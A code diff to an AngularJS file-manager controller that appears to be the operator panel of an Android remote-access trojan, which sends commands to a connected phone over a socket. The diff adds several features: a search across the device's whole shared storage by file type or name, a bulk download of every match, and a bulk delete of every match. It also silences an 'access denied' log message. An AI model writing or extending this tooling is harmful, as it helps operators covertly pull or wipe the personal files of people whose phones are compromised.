@@ -357,10 +357,14 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     $fmCtrl.load = 'loading';
     $fmCtrl.files = [];
     $scope.selectedFilter = 'all';
+    $scope.searchText = '';
+    $scope.isSearchingAll = false;
+    $scope.searchResults = [];
+    $scope.currentPathArray = ['/'];
+    $scope.activeSearchType = ''; // Track which search button is active
 
     var fileManager = CONSTANTS.orders.fileManager;
     var deleteFileFolder = CONSTANTS.orders.deleteFileFolder;
-
 
     // remove socket listner
     $fmCtrl.$on('$destroy', () => {
@@ -386,13 +390,6 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             $rootScope.Log('Saving file..');
             var filePath = path.join(downloadsPath, data.name);
 
-            // function to save the file to my local disk
-            // fs.outputFile(filePath, data.buffer, (err) => {
-            //     if (err)
-            //         $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
-            //     else
-            //         $rootScope.Log('File saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
-            // });
             fs.outputFile(filePath, data.buffer, (err) => {
                 if (err) {
                     $rootScope.Log('Saving file failed', CONSTANTS.logStatus.FAIL);
@@ -407,13 +404,19 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
                 }
             });
 
+        } else if (data.searchResults) { // response with search results
+            $rootScope.Log('Search results arrived', CONSTANTS.logStatus.SUCCESS);
+            $fmCtrl.load = '';
+            $scope.searchResults = data.searchResults;
+            $fmCtrl.$apply();
+
         } else if (data.length != 0) { // response with files list
             $rootScope.Log('Files list arrived', CONSTANTS.logStatus.SUCCESS);
             $fmCtrl.load = '';
             $fmCtrl.files = data;
             $fmCtrl.$apply();
         } else {
-            $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
+            // $rootScope.Log('That directory is inaccessible (Access denied)', CONSTANTS.logStatus.FAIL);
             $fmCtrl.load = '';
             $fmCtrl.$apply();
         }
@@ -421,7 +424,7 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     });
 
 
-    // when foder is clicked
+    // when folder is clicked
     $fmCtrl.getFiles = (file) => {
         if (file != null) {
             $fmCtrl.load = 'loading';
@@ -431,12 +434,11 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     };
 
     // when save button is clicked
-    // send request to bring file's' binary
+    // send request to bring file's binary
     $fmCtrl.saveFile = (file) => {
         $rootScope.Log('Downloading ' + '/' + file);
         socket.emit(ORDER, { order: fileManager, extra: 'dl', path: '/' + file });
     }
-    $scope.currentPathArray = ['/'];
 
     $scope.getFiles = (filePath) => {
         if (filePath != null) {
@@ -450,6 +452,90 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
     $scope.navigateTo = (index) => {
         const path = $scope.currentPathArray.slice(0, index + 1).join('/');
         $scope.getFiles('/' + path);
+    };
+
+    // Tìm kiếm tất cả file cùng loại trong toàn bộ máy
+    $scope.searchAllFiles = function (fileType) {
+        $scope.isSearchingAll = true;
+        $scope.searchResults = [];
+        $scope.activeSearchType = fileType; // Set active search type
+        $rootScope.Log('Searching all ' + fileType + ' files in device...');
+
+        // Gửi yêu cầu tìm kiếm tất cả file cùng loại
+        socket.emit(ORDER, {
+            order: fileManager,
+            extra: 'search',
+            fileType: fileType,
+            searchPath: '/storage/emulated/0/'
+        });
+    };
+
+    // Tìm kiếm theo tên file
+    $scope.searchFilesByName = function () {
+        if (!$scope.searchText.trim()) {
+            $scope.isSearchingAll = false;
+            $scope.activeSearchType = ''; // Clear active search type
+            return;
+        }
+
+        $scope.isSearchingAll = true;
+        $scope.searchResults = [];
+        $scope.activeSearchType = 'name'; // Set active search type for name search
+        $rootScope.Log('Searching files with name: ' + $scope.searchText);
+
+        socket.emit(ORDER, {
+            order: fileManager,
+            extra: 'searchByName',
+            searchText: $scope.searchText,
+            searchPath: '/storage/emulated/0/'
+        });
+    };
+
+    // Quay lại chế độ xem thư mục bình thường
+    $scope.backToNormalView = function () {
+        $scope.isSearchingAll = false;
+        $scope.searchResults = [];
+        $scope.searchText = '';
+        $scope.activeSearchType = ''; // Clear active search type
+        $scope.getFiles('/' + $scope.currentPathArray.join('/'));
+    };
+
+    // Tải xuống tất cả file trong kết quả tìm kiếm
+    $scope.downloadAllSearchResults = function () {
+        if ($scope.searchResults.length === 0) {
+            $rootScope.Log('No files to download', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        $rootScope.Log('Downloading ' + $scope.searchResults.length + ' files...');
+
+        $scope.searchResults.forEach(function (file, index) {
+            setTimeout(function () {
+                $scope.saveFile(file.path);
+            }, index * 1000); // Tải xuống từng file cách nhau 1 giây
+        });
+    };
+
+    // Xóa tất cả file trong kết quả tìm kiếm
+    $scope.deleteAllSearchResults = function () {
+        if ($scope.searchResults.length === 0) {
+            $rootScope.Log('No files to delete', CONSTANTS.logStatus.FAIL);
+            return;
+        }
+
+        if (confirm('Are you sure you want to delete all ' + $scope.searchResults.length + ' files?')) {
+            $rootScope.Log('Deleting ' + $scope.searchResults.length + ' files...');
+
+            $scope.searchResults.forEach(function (file) {
+                $scope.deleteFile(file.path);
+            });
+
+            // Refresh search results after deletion
+            setTimeout(function () {
+                $scope.searchResults = [];
+                $scope.isSearchingAll = false;
+            }, 2000);
+        }
     };
 
     // File type filter function
@@ -470,7 +556,11 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
             case 'videos':
                 return /\.(mp4|avi|mov|wmv|flv|webm|mkv|m4v|3gp|mpg|mpeg|ts|vob|ogv|divx|xvid|rm|rmvb|asf|swf)$/i.test(fileName);
             case 'documents':
-                return /\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|odt|ods|odp|md|log|csv|json|xml|html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1|zip|rar|7z|tar|gz|bz2)$/i.test(fileName);
+                return /\.(pdf|doc|docx|xls|xlsx|ppt|pptx|txt|rtf|odt|ods|odp|md|log|csv|json|xml|html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1)$/i.test(fileName);
+            case 'audio':
+                return /\.(mp3|wav|flac|aac|ogg|wma|m4a|aiff|au|ra|mid|midi)$/i.test(fileName);
+            case 'archives':
+                return /\.(zip|rar|7z|tar|gz|bz2|xz|lzma|arj|cab|iso|dmg)$/i.test(fileName);
             default:
                 return true;
         }
@@ -504,6 +594,7 @@ app.controller("FmCtrl", function ($scope, $rootScope) {
         if (/\.(csv|json|xml)$/i.test(name)) return 'file code';
         if (/\.(html|htm|css|js|php|py|java|c|cpp|h|sql|sh|bat|ps1)$/i.test(name)) return 'file code';
         if (/\.(zip|rar|7z|tar|gz|bz2)$/i.test(name)) return 'file archive';
+        if (/\.(mp3|wav|flac|aac|ogg|wma|m4a|aiff|au|ra|mid|midi)$/i.test(name)) return 'file audio';
 
         return 'file';
     };
